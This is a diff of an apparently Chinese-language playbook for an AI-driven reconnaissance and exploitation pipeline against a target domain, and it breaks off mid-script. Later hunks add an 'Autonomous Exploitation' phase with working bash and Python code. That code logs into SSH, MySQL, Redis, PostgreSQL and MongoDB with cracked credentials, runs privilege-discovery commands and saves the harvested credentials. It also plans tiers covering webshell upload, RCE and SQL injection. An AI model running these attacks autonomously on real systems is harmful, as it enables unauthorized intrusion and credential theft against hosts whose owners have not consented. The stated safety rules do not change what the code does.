@@ -155,15 +155,15 @@ WORK_ROOT="$(pwd)"
 # Phase 2-6 依赖大量 CLI 工具，缺任何一个都会导致扫描中断。
 # AI 必须先跑 auto_install.sh check 检测依赖。
 # 如果检测失败，优先提示用户手动运行 auto_install.sh，避免在主流程中边装边扫。
-	echo ""
-	echo "🔧 检查依赖环境..."
-	if ! bash "$SCRIPT_DIR"/references/scripts/auto_install.sh check; then
-	    echo ""
-	    echo "❌ 环境检查失败，优先请用户手动运行依赖安装脚本"
-	    echo "   bash \"$SCRIPT_DIR\"/references/scripts/auto_install.sh"
-	    exit 1
-	fi
-	echo ""
+  echo ""
+  echo "🔧 检查依赖环境..."
+  if ! bash "$SCRIPT_DIR"/references/scripts/auto_install.sh check; then
+      echo ""
+      echo "❌ 环境检查失败，优先请用户手动运行依赖安装脚本"
+      echo "   bash \"$SCRIPT_DIR\"/references/scripts/auto_install.sh"
+      exit 1
+  fi
+  echo ""
 
 # 根据 Phase 1 用户选择设置（AI 根据用户回答填入）
 PORT_RANGE=2          # 1=top-100, 2=top-1000, 3=全端口
@@ -216,8 +216,9 @@ run_with_watchdog() {
   [ "$1" = "--" ] && shift
 
   mkdir -p "$TARGET_DIR/runtime"
-  : > "$err_file"
-  [ -n "$progress_file" ] && : > "$progress_file"
+  # touch 保留断点续跑数据，truncate 在首次运行时创建空文件
+  [ -f "$err_file" ] || : > "$err_file"
+  [ -z "$progress_file" ] || [ -f "$progress_file" ] || : > "$progress_file"
 
   (
     timeout --kill-after=30 "$total_timeout" "$@" 2>>"$err_file"
@@ -243,7 +244,10 @@ run_with_watchdog() {
       echo "⚠️ ${tool_name} ${idle_timeout}s 无进度，终止 PID $scan_pid" | tee -a "$err_file"
       kill "$scan_pid" 2>/dev/null || true
       sleep 15
-      kill -9 "$scan_pid" 2>/dev/null || true
+      # 确认进程仍在才 kill -9，避免误杀 PID 复用
+      if kill -0 "$scan_pid" 2>/dev/null; then
+        kill -9 "$scan_pid" 2>/dev/null || true
+      fi
       break
     fi
   done
@@ -323,31 +327,40 @@ fi
 
 ### 2.3 ksubdomain
 ```bash
-# ksubdomain 必须在项目根目录运行（读/写 ksubdomain.yaml）
-pushd "$SCRIPT_DIR" >/dev/null || { echo "❌ 无法进入 $SCRIPT_DIR"; exit 1; }
-# ksubdomain.yaml 已存在则直接复用，避免多目标/多次运行反复改写共享配置
-if [ ! -f "$SCRIPT_DIR/ksubdomain.yaml" ]; then
+# ksubdomain 从每目标独立目录运行，避免多目标并行时共享 ksubdomain.yaml 冲突
+KSUB_WORKDIR="$TARGET_DIR/runtime/ksubdomain_work"
+mkdir -p "$KSUB_WORKDIR"
+pushd "$KSUB_WORKDIR" >/dev/null || { echo "❌ 无法进入 $KSUB_WORKDIR"; exit 1; }
+
+# 优先复用项目级已验证的配置，否则生成新的
+if [ -f "$SCRIPT_DIR/ksubdomain.yaml" ]; then
+  cp "$SCRIPT_DIR/ksubdomain.yaml" "$KSUB_WORKDIR/ksubdomain.yaml"
+  echo "ℹ️ 复用项目级 ksubdomain.yaml → $KSUB_WORKDIR/"
+elif [ -f "$KSUB_WORKDIR/ksubdomain.yaml" ]; then
+  echo "ℹ️ 复用已有 $KSUB_WORKDIR/ksubdomain.yaml"
+else
   run_with_watchdog "ksubdomain_test" 300 120 \
-    "$SCRIPT_DIR/ksubdomain.yaml" \
+    "$KSUB_WORKDIR/ksubdomain.yaml" \
     "$TARGET_DIR/ksubdomain_subdomains/ksubdomain_test.err.log" -- \
     ksubdomain test
   # 动态获取本机 IP 写入配置（必须校验 IP 格式）
   IP=$(curl -s --fail --connect-timeout 10 --max-time 15 https://api.ipify.org 2>/dev/null || true)
   if echo "$IP" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
-    sed -i "1s/.*/src_ip: $IP/" "$SCRIPT_DIR"/ksubdomain.yaml
+    sed -i "1s/.*/src_ip: $IP/" "$KSUB_WORKDIR/ksubdomain.yaml"
   else
-    echo "⚠️ 获取/校验本机 IP 失败，保持 ksubdomain.yaml 现有配置"
+    echo "⚠️ 获取/校验本机 IP 失败，保持默认配置"
   fi
-else
-  echo "ℹ️ 复用现有 ksubdomain.yaml，不重复生成/改写"
+  # 保存已验证配置到项目级供后续目标复用
+  cp "$KSUB_WORKDIR/ksubdomain.yaml" "$SCRIPT_DIR/ksubdomain.yaml" 2>/dev/null || true
 fi
 BEFORE=$(safe_line_count "$TARGET_DIR/ksubdomain_subdomains/ksubdomain.txt")
 # ksubdomain 输出含 "域名=>CNAME ...=>IP" 链，用 sed 去掉 => 及之后内容，仅保留纯域名
+# 从每目标独立 workdir 运行，读取 ksubdomain.yaml
 : > "$TARGET_DIR"/ksubdomain_subdomains/ksubdomain_raw.txt
 run_with_watchdog "ksubdomain_enum" 1200 300 \
   "$TARGET_DIR/ksubdomain_subdomains/ksubdomain_raw.txt" \
   "$TARGET_DIR/ksubdomain_subdomains/ksubdomain.err.log" -- \
-  sh -c 'ksubdomain e -d "$1" --wild-filter-mode advanced --silent > "$2"' _ "$DOMAIN" "$TARGET_DIR/ksubdomain_subdomains/ksubdomain_raw.txt"
+  sh -c 'cd "$4" && ksubdomain e -d "$1" --wild-filter-mode advanced --silent > "$2"' _ "$DOMAIN" "$TARGET_DIR/ksubdomain_subdomains/ksubdomain_raw.txt" "$KSUB_WORKDIR"
 cat "$TARGET_DIR"/ksubdomain_subdomains/ksubdomain_raw.txt | tr -d '\r' | sed 's/=>.*//' | sed 's/^[[:space:]]*//; s/[[:space:]]*$//' | sed '/^$/d' | sort | uniq | anew "$TARGET_DIR"/ksubdomain_subdomains/ksubdomain.txt
 AFTER=$(safe_line_count "$TARGET_DIR/ksubdomain_subdomains/ksubdomain.txt")
 NEW=$((AFTER - BEFORE))
@@ -471,7 +484,7 @@ for i in 1 2 3; do
   RANDOM_SUB="$RANDOM_STR.$DOMAIN"
 
   echo "[尝试 $i/3] 解析 $RANDOM_SUB ..."
-  if dig +short "$RANDOM_SUB" +time=5 2>/dev/null | grep -q '[0-9]'; then
+  if dig +short "$RANDOM_SUB" +timeout=5 2>/dev/null | grep -q '[0-9]'; then
     WILDCARD_CONFIRM=$((WILDCARD_CONFIRM + 1))
     echo "  ⚠️ 解析成功 (命中 $WILDCARD_CONFIRM/3)"
   else
@@ -728,6 +741,34 @@ run_with_watchdog "httpx_alive" 3600 600 \
   "targets/$DOMAIN/active_webs/httpx_alive.err.log" -- \
   sh -c 'httpx -l "$1" -silent | sort | uniq > "$2"' _ "targets/$DOMAIN/active_ports/active_ports.txt" "targets/$DOMAIN/active_webs/httpx_alive_raw.txt"
 
+# 兜底探测: 解析成功但 naabu 未返回端口的域名，用 httpx 补扫默认 80/443
+# 防止把只有标准端口 Web 服务的站点误判为"无服务"
+FALLBACK_INPUT="targets/$DOMAIN/active_webs/httpx_fallback_input.txt"
+: > "$FALLBACK_INPUT"
+if [ -s "targets/$DOMAIN/active_subdomains/active_subdomains.txt" ]; then
+  # 提取 active_subdomains 中有 DNS 解析但未出现在 active_ports 中的域名
+  cat "targets/$DOMAIN/active_subdomains/active_subdomains.txt" | while read -r domain; do
+    if ! grep -qF "$domain" "targets/$DOMAIN/active_ports/active_ports.txt" 2>/dev/null; then
+      echo "http://$domain" >> "$FALLBACK_INPUT"
+      echo "https://$domain" >> "$FALLBACK_INPUT"
+    fi
+  done
+fi
+if [ -s "$FALLBACK_INPUT" ]; then
+  FALLBACK_COUNT=$(wc -l < "$FALLBACK_INPUT")
+  echo "🔍 httpx 兜底探测: $FALLBACK_COUNT 个候选 URL (DNS 已解析但端口扫描未覆盖)"
+  run_with_watchdog "httpx_fallback" 3600 600 \
+    "targets/$DOMAIN/active_webs/httpx_fallback_raw.txt" \
+    "targets/$DOMAIN/active_webs/httpx_fallback.err.log" -- \
+    sh -c 'httpx -l "$1" -silent | sort | uniq > "$2"' _ "$FALLBACK_INPUT" "targets/$DOMAIN/active_webs/httpx_fallback_raw.txt"
+  # 合并兜底结果到 alive 列表
+  cat "targets/$DOMAIN/active_webs/httpx_fallback_raw.txt" 2>/dev/null | \
+    anew "targets/$DOMAIN/active_webs/httpx_alive_raw.txt"
+  echo "  兜底探测命中: $(wc -l < targets/$DOMAIN/active_webs/httpx_fallback_raw.txt 2>/dev/null || echo 0) 个"
+else
+  echo "⏭️ 兜底探测: 无候选（所有已解析域名均已覆盖端口扫描）"
+fi
+
 # 第二遍 httpx：采集 JSON 指纹
 run_with_watchdog "httpx_fingerprint" 3600 600 \
   "targets/$DOMAIN/active_webs/active_websfinger.json" \
@@ -762,12 +803,20 @@ if [ "$SCREENSHOT" = "yes" ] || [ "$SCREENSHOT" = "y" ]; then
   echo "📸 开始 Web 截图..."
   for attempt in 1 2 3; do
     echo "[截图 尝试 $attempt/3]"
+    # 切换到目标目录运行，确保 gowitness.sqlite3 写入 $TARGET_DIR
+    pushd "$TARGET_DIR" >/dev/null
+    # gowitness --write-db 默认在 CWD 生成 gowitness.sqlite3
+    # watchdog 监控 CWD 下的文件（运行时真正在被写入的文件）
     run_with_watchdog "gowitness" 7200 600 \
-      "targets/$DOMAIN/web_screenshots/gowitness.sqlite3" \
-      "targets/$DOMAIN/web_screenshots/gowitness.err.log" -- \
-      gowitness scan file -f "targets/$DOMAIN"/active_webs/active_webs.txt \
-        --write-db -s "targets/$DOMAIN"/web_screenshots/screenshots -t 10 -T 40
-    mv gowitness.sqlite3 "targets/$DOMAIN"/web_screenshots/gowitness.sqlite3 2>/dev/null
+      "./gowitness.sqlite3" \
+      "$TARGET_DIR/web_screenshots/gowitness.err.log" -- \
+      gowitness scan file -f "$TARGET_DIR"/active_webs/active_webs.txt \
+        --write-db -s "$TARGET_DIR"/web_screenshots/screenshots -t 10 -T 40
+    # 扫描完成后移动到最终位置
+    if [ -f gowitness.sqlite3 ]; then
+      mv gowitness.sqlite3 "$TARGET_DIR"/web_screenshots/gowitness.sqlite3 2>/dev/null
+    fi
+    popd >/dev/null
 
     SCREEN_COUNT=$(ls "targets/$DOMAIN"/web_screenshots/screenshots/ 2>/dev/null | wc -l)
     if [ "$SCREEN_COUNT" -gt 0 ]; then
@@ -823,6 +872,8 @@ if [ ! -s "targets/$DOMAIN"/active_ports/active_ports.txt ]; then
   echo "⏭️ kscan: active_ports.txt 为空，跳过"
 else
   # 分离 IP:端口 和 Web:端口
+  # grep 可能无匹配，pipefail 下会中断管道 → 临时关闭
+  set +o pipefail
   cat "targets/$DOMAIN"/active_ports/active_ports.txt | \
     grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}' | \
     anew "targets/$DOMAIN"/active_ports/active_ips_ports.txt
@@ -830,6 +881,7 @@ else
   cat "targets/$DOMAIN"/active_ports/active_ports.txt | \
     grep -Eo '[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[0-9]{1,5}' | \
     anew "targets/$DOMAIN"/active_ports/active_webs_ports.txt
+  set -o pipefail
 
   # Web 端口指纹
   if [ -s "targets/$DOMAIN"/active_ports/active_webs_ports.txt ]; then
@@ -871,6 +923,9 @@ else
   REPORTS_TS="$(date +%s)"
   split -l 500 -d -a 4 "targets/$DOMAIN"/active_webs/active_webs.txt /tmp/afrog_work_$$/part_
 
+  # 切换到目标目录运行，确保 afrog-resume-*.afg 和 reports/ 写入 $TARGET_DIR
+  pushd "$TARGET_DIR" >/dev/null
+
   for file in /tmp/afrog_work_$$/part_*; do
     batch_name=$(basename "$file")
     echo "🔍 afrog 批次: $batch_name ($(wc -l < "$file") 目标)"
@@ -883,10 +938,11 @@ else
     find . -maxdepth 1 -name "afrog-resume-*.afg" -newer /tmp/afrog_work_$$ \
       -exec mv {} "targets/$DOMAIN"/afrog_scan_results/ \; 2>/dev/null || true
     rm -f "$file"
-    sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
+    sync
     sleep 3
   done
   rm -rf /tmp/afrog_work_$$
+
   # 归档 afrog 自动生成的 HTML 报告目录
   if [ -d reports ]; then
     find reports -maxdepth 1 -type f -name '*.html' -newermt "@$REPORTS_TS" \
@@ -896,6 +952,8 @@ else
   # 清理 afrog 自动生成的 resume 文件（扫描已完成，无需断点续跑）
   find . -maxdepth 1 -name "afrog-resume-*.afg" -delete 2>/dev/null || true
   find "targets/$DOMAIN"/afrog_scan_results/ -name "afrog-resume-*.afg" -delete 2>/dev/null || true
+
+  popd >/dev/null
 fi
 ```
 
@@ -927,17 +985,20 @@ set -o pipefail
 if [ ! -s "targets/$DOMAIN"/active_webs/active_webs.txt ]; then
   echo "⏭️ dirsearch: active_webs.txt 为空，跳过"
 else
-  pushd "$TARGET_DIR" >/dev/null || { echo "❌ 无法进入 $TARGET_DIR，跳过 dirsearch"; exit 1; }
-  if [ -f "active_webs/active_webs.txt" ]; then
-    : > "dirsearch_result/dirsearch_progress.log"
-    run_with_watchdog "dirsearch" 7200 900 \
-      "$TARGET_DIR/dirsearch_result/dirsearch_progress.log" \
-      "$TARGET_DIR/dirsearch_result/dirsearch.err.log" -- \
-      sh -c 'python3 "$1" active_webs/active_webs.txt && find dirsearch_result -maxdepth 1 -type f -name "smart_scan_*.txt" -exec cat {} + > dirsearch_result/dirsearch_progress.log' _ "$SCRIPT_DIR/references/scripts/auto_dirsearch.py"
+  if pushd "$TARGET_DIR" >/dev/null; then
+    if [ -f "active_webs/active_webs.txt" ]; then
+      : > "dirsearch_result/dirsearch_progress.log"
+      run_with_watchdog "dirsearch" 7200 900 \
+        "$TARGET_DIR/dirsearch_result/dirsearch_progress.log" \
+        "$TARGET_DIR/dirsearch_result/dirsearch.err.log" -- \
+        sh -c 'python3 "$1" active_webs/active_webs.txt && find dirsearch_result -maxdepth 1 -type f -name "smart_scan_*.txt" -exec cat {} + > dirsearch_result/dirsearch_progress.log' _ "$SCRIPT_DIR/references/scripts/auto_dirsearch.py"
+    else
+      echo "❌ dirsearch 输入文件缺失: active_webs/active_webs.txt"
+    fi
+    popd >/dev/null
   else
-    echo "❌ dirsearch 输入文件缺失: active_webs/active_webs.txt"
+    echo "⏭️ dirsearch: 无法进入 $TARGET_DIR，跳过"
   fi
-  popd >/dev/null
 fi
 ```
 
@@ -984,22 +1045,56 @@ else
   [ ! -d ~/nuclei-templates/dast/ ] && ln -s /opt/fuzzing-templates ~/nuclei-templates/dast/ 2>/dev/null
 
   # ── Step 1: Katana 爬虫 ──
-  # 检测 headless 浏览器可用性
-  HEADLESS_FLAG=""
+  # 检测 headless 浏览器可用性（先尝试 headless，无输出则降级）
+  HAS_CHROME=false
   if command -v chromium >/dev/null 2>&1 || command -v google-chrome >/dev/null 2>&1; then
-    HEADLESS_FLAG="-headless"
-    echo "🔍 Katana: headless 模式 (Chrome 可用)"
-  else
-    echo "⚠️ Katana: 非 headless 模式 (Chrome 不可用)"
+    HAS_CHROME=true
   fi
 
-  # katana 超时保护: 20min 总超时 + 30s SIGKILL 兜底
   : > "targets/$DOMAIN"/nuclei_fuzzing_result/katana_urls_raw.txt
   mkdir -p "targets/$DOMAIN"/runtime/katana_tmp
-  run_with_watchdog "katana" 1200 600 \
-    "targets/$DOMAIN/nuclei_fuzzing_result/katana_urls_raw.txt" \
-    "targets/$DOMAIN/nuclei_fuzzing_result/katana_err.log" -- \
-    sh -c 'TMPDIR="$4" katana -list "$1" $2 -no-sandbox -nc -d 5 -output-template "{{url}}" -silent -fs rdn -rl 50 -dr > "$3"' _ "targets/$DOMAIN/active_webs/active_webs.txt" "$HEADLESS_FLAG" "targets/$DOMAIN/nuclei_fuzzing_result/katana_urls_raw.txt" "targets/$DOMAIN/runtime/katana_tmp"
+
+  KATANA_RETRY=0
+  for KATANA_MODE in "headless" "no-headless"; do
+    # 非 headless 模式只在 headless 失败且无输出时尝试
+    if [ "$KATANA_MODE" = "no-headless" ]; then
+      KATANA_OUT_SIZE=$(wc -c < "targets/$DOMAIN/nuclei_fuzzing_result/katana_urls_raw.txt" 2>/dev/null || echo 0)
+      if [ "$KATANA_OUT_SIZE" -gt 100 ]; then
+        echo "✅ Katana headless 已有输出 ($KATANA_OUT_SIZE bytes)，跳过降级"
+        break
+      fi
+      echo "⚠️ Katana headless 无输出，降级为非 headless 模式重试..."
+      : > "targets/$DOMAIN"/nuclei_fuzzing_result/katana_urls_raw.txt
+    fi
+
+    if [ "$KATANA_MODE" = "headless" ] && ! $HAS_CHROME; then
+      echo "⚠️ Katana: Chrome 不可用，直接使用非 headless 模式"
+      continue
+    fi
+
+    HEADLESS_FLAG=""
+    [ "$KATANA_MODE" = "headless" ] && HEADLESS_FLAG="-headless"
+    echo "🔍 Katana: $KATANA_MODE 模式"
+
+    # katana 超时保护: headless=10min idle=120s, non-headless=20min idle=600s
+    if [ "$KATANA_MODE" = "headless" ]; then
+      KATANA_TOTAL=600; KATANA_IDLE=120
+    else
+      KATANA_TOTAL=1200; KATANA_IDLE=600
+    fi
+
+    run_with_watchdog "katana_${KATANA_MODE}" "$KATANA_TOTAL" "$KATANA_IDLE" \
+      "targets/$DOMAIN/nuclei_fuzzing_result/katana_urls_raw.txt" \
+      "targets/$DOMAIN/nuclei_fuzzing_result/katana_${KATANA_MODE}.err.log" -- \
+      sh -c 'TMPDIR="$4" katana -list "$1" $2 -no-sandbox -nc -d 5 -output-template "{{url}}" -silent -fs rdn -rl 50 -dr > "$3"' _ "targets/$DOMAIN/active_webs/active_webs.txt" "$HEADLESS_FLAG" "targets/$DOMAIN/nuclei_fuzzing_result/katana_urls_raw.txt" "targets/$DOMAIN/runtime/katana_tmp"
+
+    # headless 有输出就停止，不降级
+    if [ "$KATANA_MODE" = "headless" ]; then
+      KATANA_OUT_SIZE=$(wc -c < "targets/$DOMAIN/nuclei_fuzzing_result/katana_urls_raw.txt" 2>/dev/null || echo 0)
+      [ "$KATANA_OUT_SIZE" -gt 100 ] && break
+    fi
+  done
+
   cat "targets/$DOMAIN"/nuclei_fuzzing_result/katana_urls_raw.txt | \
     anew "targets/$DOMAIN"/nuclei_fuzzing_result/katana_urls.txt
 
@@ -1116,8 +1211,10 @@ printf "  %-45s %s 条\n" "afrog" "$(find "targets/$DOMAIN"/afrog_scan_results/ 
 printf "  %-45s %s 条\n" "backup_scan" "$(wc -l < "targets/$DOMAIN"/backup_result/backup_scan.txt 2>/dev/null || echo 0)"
 printf "  %-45s %s 条\n" "kscan_web_finger" "$(wc -l < "targets/$DOMAIN"/active_ports/active_webs_portsfinger.txt 2>/dev/null || echo 0)"
 printf "  %-45s %s 条\n" "kscan_ip_brute" "$(wc -l < "targets/$DOMAIN"/active_ports/active_ips_portsfinger.txt 2>/dev/null || echo 0)"
-# 弱口令成功提取
+# 弱口令成功提取 (grep 可能无匹配，pipefail 下临时关闭)
+set +o pipefail
 grep 'Success' "targets/$DOMAIN"/active_ports/active_ips_portsfinger.txt 2>/dev/null | sort | uniq | anew "targets/$DOMAIN"/brute_result/brute_success.txt
+set -o pipefail
 printf "  %-45s %s 条\n" "brute_success" "$(wc -l < "targets/$DOMAIN"/brute_result/brute_success.txt 2>/dev/null || echo 0)"
 # dirsearch 结果统计
 DIRSEARCH_COUNT=$(find "targets/$DOMAIN"/dirsearch_result -maxdepth 1 -type f -name 'smart_scan_*.txt' -exec cat {} + 2>/dev/null | wc -l)
@@ -1354,6 +1451,867 @@ HTML 报告包含：
 - 📸 页面截图预览（如果启用了截图）
 - 全部离线可用，无 CDN 依赖
 
+### 7.4 📋 生成利用计划 (Phase 7→8 数据桥)
+
+AI 在完成 Phase 7.2 研判后，**必须**生成结构化 `exploit_plan.json`，作为 Phase 8 的输入。
+
+```bash
+# AI 根据 7.2 研判结果，生成 exploit_plan.json
+cat > "targets/$DOMAIN"/exploit_result/exploit_plan.json <<'PLANEOF'
+[
+  {
+    "id": "c-001",
+    "tier": 0,
+    "vuln_type": "weak-password-ssh",
+    "target": "<host>:<port>",
+    "asset": "<host>",
+    "cred": "<user>:<pass>",
+    "source": "brute_success.txt",
+    "action": "ssh-login",
+    "severity": "critical",
+    "note": "kscan hydra 确认"
+  }
+]
+PLANEOF
+
+echo "✅ exploit_plan.json 已生成: $(python3 -c "import json; print(len(json.load(open('targets/$DOMAIN/exploit_result/exploit_plan.json'))))" 2>/dev/null || echo 0) 条候选"
+```
+
+**字段说明**:
+
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| `id` | string | 唯一标识 `c-NNN` |
+| `tier` | int | 优先级 0-5（见 Phase 8.1 分级表） |
+| `vuln_type` | string | 漏洞类型标签 |
+| `target` | string | 攻击目标 (host:port 或 URL) |
+| `asset` | string | 关联资产（IP 或域名） |
+| `cred` | string | 已知凭据（如有，user:pass 格式） |
+| `source` | string | 来源文件 |
+| `action` | string | 利用动作 |
+| `severity` | string | critical/high/medium/low |
+| `note` | string | 补充说明 |
+
+**AI 生成规则**:
+- Tier 0: `brute_success.txt` 每行 → 一条 `weak-password-*` 候选
+- Tier 1: Phase 7 研判中标记 RCE/CommandInj → 对应 action
+- Tier 2: SQLi URL → `sqlmap-dbs` action；backup URL → `download-extract` action
+- Tier 3: `high_value_targets.txt` 面板路径 → `default-login`；文件上传 URL → `upload-webshell`
+- Tier 4: LFI/SSTI/SSRF URL → 对应 action
+- 每条必须含 `target` 和 `action`，不能留空
+
+---
+
+## Phase 8 · Autonomous Exploitation（自主利用攻击）
+
+**目的**: 对 Phase 7 研判确认的漏洞执行实际利用攻击，获取访问权限。
+
+⚠️ **此阶段由 AI 驱动，不是固定脚本。** AI 读取 08-exploitation.md 中对应 playbook → 决策 payload → 执行命令 → 判断结果 → 决定下一步。每步都需要 AI 判断力。
+
+⚠️ **安全性硬规则**:
+- 非破坏性优先：只做读取型、回显型验证；禁止 DROP/覆盖/删除类 payload
+- 写操作止步于"可写"证明（如 Redis SET 后立即 DEL），不落地后门
+- 不重复大规模爆破（kscan 已做）；面板凭据尝试 ≤ 20 对
+- 获取的凭据/数据仅存于 `targets/$DOMAIN/exploit_result/`
+- 遇到范围外新资产或需要破坏性操作 → 停下询问
+
+### 8.0 前置检查
+
+```bash
+set -o pipefail
+
+# 空候选检查 — Phase 7 研判无有效漏洞则跳过全部 Phase 8
+# AI 在 Phase 7 研判后自行判断是否有可攻击目标
+# 无目标时输出 "⏭️ Phase 8: 无可利用漏洞，跳过" 并结束
+
+# 创建利用结果目录 (touch 保证断点续跑不丢失已有数据)
+mkdir -p "targets/$DOMAIN"/exploit_result/evidence
+touch "targets/$DOMAIN"/exploit_result/exploit_log.txt
+touch "targets/$DOMAIN"/exploit_result/exploit_success.txt
+touch "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+echo "✅ exploit_result/ 目录已创建"
+```
+
+### 8.1 构建优先级队列
+
+AI 从 Phase 7 研判结果中提取所有 `✅ 确认有效` 和 `⚠️ 待验证` 的发现，按优先级排序：
+
+```
+Tier 0: brute_success.txt       → 弱口令（直接登录）
+Tier 1: RCE / Command Injection → 直接拿 shell
+Tier 2: SQL Injection           → 数据提取 → 凭据
+Tier 2: Backup / Config Leaks   → 凭据收割
+Tier 3: Default Credentials     → 面板登录
+Tier 3: Login Form Brute-force  → 登录口爆破
+Tier 3: File Upload             → webshell
+Tier 4: LFI / Path Traversal    → 配置读取
+Tier 4: SSTI                    → RCE
+Tier 4: SSRF                    → 内网探测
+Tier 4: OAuth Abuse             → redirect_uri / state / scope
+Tier 5: Registration Exploit    → 注册 → 登录 → 越权测试
+```
+
+**AI 动作**: 读取 Phase 7.4 生成的 `exploit_plan.json` 作为结构化输入：
+
+```bash
+set -o pipefail
+
+PLAN_FILE="targets/$DOMAIN/exploit_result/exploit_plan.json"
+
+if [ ! -s "$PLAN_FILE" ]; then
+  echo "⏭️ Phase 8: exploit_plan.json 为空或不存在，跳过利用阶段"
+  # Phase 7.4 必须先生成此文件
+else
+  # 按 tier 统计
+  echo "📋 利用计划:"
+  python3 -c "
+import json
+with open('$PLAN_FILE') as f:
+    plan = json.load(f)
+tiers = {}
+for c in plan:
+    t = c.get('tier', 99)
+    tiers[t] = tiers.get(t, 0) + 1
+for t in sorted(tiers):
+    print(f'  Tier {t}: {tiers[t]} 条候选')
+print(f'  总计: {len(plan)} 条')
+"
+fi
+```
+
+### 8.2 Tier 0: 弱口令利用
+
+**触发**: `brute_result/brute_success.txt` 非空。
+
+```bash
+set -o pipefail
+
+if [ ! -s "targets/$DOMAIN"/brute_result/brute_success.txt ]; then
+  echo "⏭️ 弱口令利用: brute_success.txt 为空，跳过"
+else
+  echo "🔑 开始弱口令验证与利用..."
+
+  while IFS= read -r line; do
+    # 解析 kscan hydra 输出格式: Success  <service>  <user:pass>  <ip:port>
+    SERVICE=$(echo "$line" | awk '{print $2}')
+    CRED=$(echo "$line" | awk '{print $3}')
+    TARGET=$(echo "$line" | awk '{print $4}')
+    USER=$(echo "$CRED" | cut -d: -f1)
+    PASS=$(echo "$CRED" | cut -d: -f2)
+    HOST=$(echo "$TARGET" | cut -d: -f1)
+    PORT=$(echo "$TARGET" | cut -d: -f2)
+
+    TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+    ATTEMPT_ID="${SERVICE}_${HOST}_${USER}"
+
+    echo "▶ ${ATTEMPT_ID}: $SERVICE $USER@$HOST:$PORT"
+
+    case "$SERVICE" in
+      ssh)
+        RESULT=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
+          -o ConnectTimeout=10 -o ServerAliveInterval=5 \
+          "$USER@$HOST" -p "$PORT" \
+          'echo "HOSTNAME=$(hostname)"; echo "UNAME=$(uname -a)"; echo "WHOAMI=$(whoami)"; echo "ID=$(id)"; echo "SUDO=$(sudo -l 2>/dev/null | head -5)"' 2>/dev/null)
+
+        if echo "$RESULT" | grep -q 'WHOAMI='; then
+          echo "✅ SSH SUCCESS: $USER@$HOST:$PORT"
+          echo "$RESULT" > "targets/$DOMAIN"/exploit_result/evidence/${ATTEMPT_ID}_output.txt
+          echo "ssh-shell|$HOST:$PORT|$USER:$PASS|$(echo "$RESULT" | grep 'WHOAMI=' | cut -d= -f2)" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          echo "ssh|$HOST:$PORT|$USER:$PASS" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+
+          # 横向移动检查
+          echo "$RESULT" | grep -q 'root' && echo "🎯 ROOT ACCESS: $HOST"
+          echo "$RESULT" | grep -q 'NOPASSWD' && echo "🎯 SUDO NOPASSWD: $HOST"
+        else
+          echo "⚠️ SSH FAILED: $USER@$HOST:$PORT"
+          echo "$TS|failed|ssh|$HOST:$PORT|$USER|Login failed" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_log.txt
+        fi
+        ;;
+
+      mysql)
+        RESULT=$(mysql -h "$HOST" -u "$USER" -p"$PASS" -P "$PORT" \
+          --connect-timeout=10 -e 'SELECT VERSION(); SHOW DATABASES();' 2>/dev/null)
+        if [ -n "$RESULT" ]; then
+          echo "✅ MySQL SUCCESS: $USER@$HOST:$PORT"
+          echo "$RESULT" > "targets/$DOMAIN"/exploit_result/evidence/${ATTEMPT_ID}_output.txt
+          echo "mysql-access|$HOST:$PORT|$USER:$PASS|$(echo "$RESULT" | head -1)" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          echo "mysql|$HOST:$PORT|$USER:$PASS" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        else
+          echo "⚠️ MySQL FAILED: $USER@$HOST:$PORT"
+        fi
+        ;;
+
+      redis)
+        RESULT=$(redis-cli -h "$HOST" -p "$PORT" -a "$PASS" --no-auth-warning INFO SERVER 2>/dev/null)
+        if echo "$RESULT" | grep -q 'redis_version'; then
+          echo "✅ Redis SUCCESS: $HOST:$PORT"
+          echo "$RESULT" > "targets/$DOMAIN"/exploit_result/evidence/${ATTEMPT_ID}_output.txt
+          echo "redis-access|$HOST:$PORT||$(echo "$RESULT" | grep 'redis_version')" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          # Redis 无用户概念，记录空凭据占位
+          echo "redis|$HOST:$PORT||$PASS" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        else
+          echo "⚠️ Redis FAILED: $HOST:$PORT"
+        fi
+        ;;
+
+      postgresql|psql)
+        RESULT=$(PGPASSWORD="$PASS" psql -h "$HOST" -p "$PORT" -U "$USER" -d postgres \
+          -c "SELECT version();" -c "\l" --no-password -t -A 2>/dev/null)
+        if [ -n "$RESULT" ]; then
+          echo "✅ PostgreSQL SUCCESS: $USER@$HOST:$PORT"
+          echo "$RESULT" > "targets/$DOMAIN"/exploit_result/evidence/${ATTEMPT_ID}_output.txt
+          echo "postgresql-access|$HOST:$PORT|$USER:$PASS|$(echo "$RESULT" | head -1)" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          echo "postgresql|$HOST:$PORT|$USER:$PASS" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        else
+          echo "⚠️ PostgreSQL FAILED: $USER@$HOST:$PORT"
+        fi
+        ;;
+
+      mongodb|mongo)
+        RESULT=$(python3 - <<'PY' "$HOST" "$PORT" "$USER" "$PASS"
+import sys
+try:
+    from pymongo import MongoClient
+    host, port, user, pwd = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
+    uri = f'mongodb://{user}:{pwd}@{host}:{port}/'
+    client = MongoClient(uri, serverSelectionTimeoutMS=10000)
+    info = client.server_info()
+    print(f"MongoDB version: {info['version']}")
+    print(f"Databases: {client.list_database_names()}")
+    client.close()
+except Exception as e:
+    print(f'MongoDB connection failed: {e}')
+PY
+)
+        if echo "$RESULT" | grep -q 'MongoDB version'; then
